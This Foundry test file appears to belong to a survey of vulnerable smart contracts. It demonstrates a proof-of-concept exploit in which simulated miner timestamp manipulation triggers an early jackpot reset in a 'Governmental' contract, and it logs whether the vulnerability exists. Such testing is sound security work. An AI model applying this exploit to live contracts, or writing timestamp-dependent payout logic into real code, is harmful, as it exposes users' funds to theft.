// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract GovernmentalTimestampTest is Test {
    Governmental governmental;
    address owner = makeAddr("owner");
    address investor = makeAddr("investor");
    
    function setUp() public {
        // Deploy Governmental contract with initial funding
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        governmental = new Governmental{value: 1 ether}();
        
        // Fund test investor
        vm.deal(investor, 10 ether);
    }

    function test_minerCanManipulateTimestamp() public {
        // Initial investment at t=0
        vm.warp(0);
        vm.prank(investor);
        governmental.invest{value: 0.5 ether}();
        
        // Verify state after initial investment
        assertEq(governmental.lastInvestor(), investor, "Investor should be set");
        assertEq(governmental.jackpot(), 1.25 ether, "Jackpot should be incremented");

        // Attempt reset after 59 seconds (should fail)
        vm.warp(59);
        vm.expectRevert();
        governmental.resetInvestment();
        
        // Verify state unchanged after failed reset attempt
        assertEq(governmental.lastInvestor(), investor, "Investor should still be set");

        // Miner manipulates timestamp to 60s even though only 59.5s passed
        vm.warp(60);
        
        console.log("--- BEFORE-Trigger ---");
        address lastInvestorBefore = governmental.lastInvestor();
        uint256 jackpotBefore = governmental.jackpot();
        uint256 winnersBefore = governmental.totalWinners();
        console.log("LastInvestor (before):", lastInvestorBefore);
        console.log("Jackpot (before):", jackpotBefore);
        console.log("TotalWinners (before):", winnersBefore);

        console.log("--- Trigger: resetInvestment() ---"); 
        // Reset investment succeeds due to miner-controlled timestamp
        governmental.resetInvestment();

        console.log("--- AFTER-Trigger ---");
        address lastInvestorAfter = governmental.lastInvestor();
        uint256 jackpotAfter = governmental.jackpot();
        uint256 winnersAfter = governmental.totalWinners();
        console.log("LastInvestor (after):", lastInvestorAfter);
        console.log("Jackpot (after):", jackpotAfter);
        console.log("TotalWinners (after):", winnersAfter);

        // Verify state changes
        bool lastInvestorChanged = (lastInvestorAfter == address(0));
        bool jackpotReset = (jackpotAfter == 1 ether);
        bool winnersIncreased = (winnersAfter == winnersBefore + 1);
        bool exploitSuccess = lastInvestorChanged && jackpotReset && winnersIncreased;
        
        // Final verdict
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Miner manipulation of timestamp led to premature state reset");
        } else {
            console.log("Vulnerability not Exist: Contract state changes not as expected");
        }
    }
}